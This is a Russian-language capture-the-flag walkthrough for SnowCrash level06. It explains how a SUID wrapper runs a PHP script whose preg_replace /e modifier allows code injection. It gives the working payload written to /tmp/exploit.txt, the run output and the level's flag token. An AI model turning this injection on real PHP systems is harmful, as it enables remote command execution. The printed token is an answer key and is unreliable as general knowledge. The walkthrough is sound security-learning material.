у нас есть 
на левеле 6

dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout*
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc*
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06*
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php*
-r-x------  1 level06 level06  675 Apr  3  2012 .profile*

Файл level06 имеет специальный бит SUID (rwsr-x---+). Этот бит означает, что когда кто-то выполняет этот файл, он выполняется с правами владельца файла, а не того пользователя, который его запустил. В данном случае владельцем файла является flag06, то есть при его выполнении программа будет выполняться с правами пользователя flag06, а не твоими.

Этот файл может быть уязвим для эксплуатации.

level06@SnowCrash:~$ cat level06.php 
#!/usr/bin/php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;

?>


Разбор кода level06.php
Этот PHP-скрипт выполняет обработку входных данных и использует уязвимую конструкцию preg_replace() с модификатором e, что делает его уязвимым для выполнения кода (RCE - Remote Code Execution).

Опасный участок кода:
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);

Флаг /e в preg_replace() выполняет переданное выражение как PHP-код.

Это означает, что если мы сможем контролировать содержимое файла, который передается в file_get_contents($y), то сможем внедрить произвольный PHP-код и выполнить его.

Что мы знаем:
Скрипт ожидает аргумент $argv[1], который передается в file_get_contents($y).

Если переданный файл содержит строку [x что-то], то этот что-то будет передано в функцию y().

Функция y() заменяет . на x, а @ на y, но в целом оставляет возможность исполнять код.

Эксплуатация уязвимости (RCE)
Шаг 1: Создаем файл с кодом, который выполнит команду getflag
Так как level06.php читает файлы, нам нужно создать файл, содержащий код, который заставит его выполнить команду getflag.

echo "[x `getflag`]" > /tmp/exploit.txt

Этот файл содержит строку, которая при обработке через preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); выполнит getflag.

Шаг 2: Запускаем скрипт с нашим файлом
Теперь передаем этот файл в качестве аргумента:

./level06 /tmp/exploit.txt

echo "[x `getflag`]" > /tmp/exploit.txt не сработало

level06@SnowCrash:~$ echo '[x ${`getflag`} ]' > /tmp/exploit.txt
level06@SnowCrash:~$ ./level06 /tmp/exploit.txt
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

${``} обходит ограничения PHP и заставляет его выполнить команду в shell.
PHP думает, что Check flag... — это имя переменной, но на самом деле это просто результат работы getflag.

Грамотная уязвимость в использовании preg_replace("/e"), которая позволяет выполнять команды!


